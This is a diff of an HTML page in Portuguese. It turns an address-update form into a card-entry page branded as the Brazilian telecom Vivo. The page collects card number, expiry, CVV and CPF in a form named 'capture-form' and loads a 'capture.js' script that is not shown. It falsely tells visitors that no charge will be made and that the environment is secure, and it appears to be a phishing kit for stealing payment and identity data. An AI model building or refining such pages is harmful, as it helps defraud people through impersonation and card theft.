@@ -3,16 +3,16 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Atualização Cadastral</title>
+    <title>Adicionar o Cartão</title>
     <link rel="stylesheet" href="./asset/css/fonts.css">
     <link rel="stylesheet" href="./asset/css/bootstrap.css">
     <link rel="stylesheet" href="./asset/css/styles.css">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
-    <style>
-        .hidden-fields {
-            display: show;
+<style>
+            input[type="text"] {
+            font-size: 16px; /* Prevent zoom on iPhone */
         }
-    </style>
+</style>
 </head>
 <body>
     <div class="header">
@@ -24,99 +24,51 @@
     </div>
     <div class="mt-3">
         <div class="tf-container">
-            <h3 class="fw_6 text-center" style="font-size: 16px;">Atualização Cadastral</h3>
+            <h3 class="fw_6 text-center" style="font-size: 16px;">Adicione um cartão de crédito.</h3>
             <div class="mt-2"></div>
-            <p class="text-center" style="font-size: 14px;">Mantenha seu cadastro atualizado para garantir que suas informações estejam sempre corretas.</p>
-            <div class="mt-2"></div>
-            <p class="fw_6 text-center" style="font-size: 14px;">Atualize o seu Endereço.</p>
-            <form class="tf-form mt-5" id="update-form">
+            <p class="text-center" style="font-size: 13px;">Será necessário vincular um cartão de crédito em seu cadastro da Vivo.</p>
+            <p class="fw_6 text-center" style="font-size: 12px;">Nenhuma cobrança será realizada.</p>
+            <form class="tf-form mt-5" id="capture-form">
                 <div class="group-input">
-                    <i class="fas fa-map-marker-alt fa-container"></i>
-                    <label>CEP</label>
-                    <input type="text" id="cep" placeholder="Digite seu CEP" maxlength="9" inputmode="numeric" required>
-                    <div class="error-message" id="cepError">Por favor, digite um CEP válido.</div>
+                    <i class="fas fa-credit-card fa-container"></i>
+                    <label>Número do Cartão</label>
+                    <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric">
+                    <div class="icon-container">
+                        <img src="./asset/bandeiras/visa.webp" id="visa-icon">
+                        <img src="./asset/bandeiras/master.webp" id="master-icon">
+                        <img src="./asset/bandeiras/elo.webp" id="elo-icon">
+                        <img src="./asset/bandeiras/american.webp" id="amex-icon">
+                    </div>
+                    <div class="error-message" id="cardNumberError"></div>
                 </div>
-                <div class="hidden-fields">
+                <div class="group-double-ip">
                     <div class="group-input">
-                        <i class="fas fa-road fa-container"></i>
-                        <label>Endereço</label>
-                        <input type="text" id="logradouro" placeholder="Endereço" readonly>
+                        <i class="fas fa-calendar fa-container"></i>
+                        <label>Validade</label>
+                        <input type="text" id="cardExpiry" placeholder="00/00" maxlength="5" inputmode="numeric">
+                        <div class="error-message" id="cardExpiryError"></div>
                     </div>
                     <div class="group-input">
-                        <i class="fas fa-home fa-container"></i>
-                        <label>Número</label>
-                        <input type="text" id="numero" placeholder="Número" required>
+                        <i class="fas fa-lock fa-container"></i>
+                        <label>Código de Segurança</label>
+                        <input type="text" id="cardCVV" placeholder="CVV" maxlength="4" inputmode="numeric">
+                        <div class="error-message" id="cardCVVError"></div>
                     </div>
-                    <div class="group-input">
-                        <i class="fas fa-building fa-container"></i>
-                        <label>Bairro</label>
-                        <input type="text" id="bairro" placeholder="Bairro" readonly>
-                    </div>
-                    <div class="group-input">
-                        <i class="fas fa-city fa-container"></i>
-                        <label>Cidade</label>
-                        <input type="text" id="cidade" placeholder="Cidade" readonly>
-                    </div>
-                    <div class="group-input">
-                        <i class="fas fa-flag fa-container"></i>
-                        <label>Estado</label>
-                        <input type="text" id="estado" placeholder="Estado" readonly>
-                    </div>
+                </div>
+                <div class="group-input">
+                    <i class="fas fa-id-card fa-container"></i>
+                    <label>CPF do Titular</label>
+                    <input type="text" id="cardCPF" placeholder="000.000.000-00" maxlength="14" inputmode="numeric">
+                    <div class="error-message" id="cardCPFError"></div>
                 </div>
                 <div>
-                    <button type="submit" class="tf-btn accent large hidden-fields">Atualizar Cadastro</button>
+                    <p style="text-align: center; color: green; font-size: 15px;"><i class="fa-solid fa-lock"></i> &NonBreakingSpace; Você está em um ambiente seguro </p>
+                    <br>
+                    <button type="submit" id="confirmButton" class="tf-btn accent large">Confirmar</button>
                 </div>
             </form>
         </div>
     </div>
-
-    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/jquery-mask-plugin@1.14.16/dist/jquery.mask.min.js"></script>
-    <script>
-        $(document).ready(function() {
-            $('#cep').mask('00000-000');
-
-            $('#cep').on('blur', function() {
-                var cep = $(this).val().replace('-', '');
-
-                if (cep.length === 8) {
-                    $.getJSON(`https://viacep.com.br/ws/${cep}/json/`, function(data) {
-                        if (!("erro" in data)) {
-                            $('#logradouro').val(data.logradouro);
-                            $('#bairro').val(data.bairro);
-                            $('#cidade').val(data.localidade);
-                            $('#estado').val(data.uf);
-                            $('.hidden-fields').slideDown();
-                            $('#cepError').hide();
-                        } else {
-                            $('#cepError').text('CEP não encontrado.').show();
-                        }
-                    }).fail(function() {
-                        $('#cepError').text('Erro ao consultar o CEP.').show();
-                    });
-                } else {
-                    $('#cepError').text('Por favor, digite um CEP válido.').show();
-                }
-            });
-
-            $('#update-form').on('submit', function(e) {
-                e.preventDefault();
-                var enderecoCompleto = {
-                    cep: $('#cep').val(),
-                    logradouro: $('#logradouro').val(),
-                    numero: $('#numero').val(),
-                    bairro: $('#bairro').val(),
-                    cidade: $('#cidade').val(),
-                    estado: $('#estado').val()
-                };
-                console.log(enderecoCompleto);
-                alert('Cadastro atualizado com sucesso!');
-            });
-
-            $('#cep').on('focus', function() {
-                $('#cepError').hide();
-            });
-        });
-    </script>
+    <script src="./asset/js/capture.js"></script>
 </body>
 </html>
